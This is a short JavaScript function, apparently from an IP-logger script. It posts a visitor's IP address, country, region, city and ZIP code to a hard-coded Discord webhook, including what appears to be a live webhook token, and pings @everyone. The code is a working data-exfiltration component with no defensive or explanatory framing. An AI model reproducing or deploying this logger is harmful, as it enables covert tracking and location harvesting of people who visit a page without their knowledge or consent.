function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discord.com/api/webhooks/1067688776803024896/9CCrgJSs8ueewP_fdd7-KZc3bQyxCqcaCUHMILihKSWeEpVNsFam7yKTURn0z0pbMEv_");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Logs",
          avatar_url: "https://cdn.discordapp.com/avatars/439205512425504771/91822393a933a9744ae12005dee17cfb.webp?", // Just Add an url to have an avatar on your webhook
          content: "@everyone",
          embeds: [
               {
                    title: "Logs",
                    color: 16711680,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}
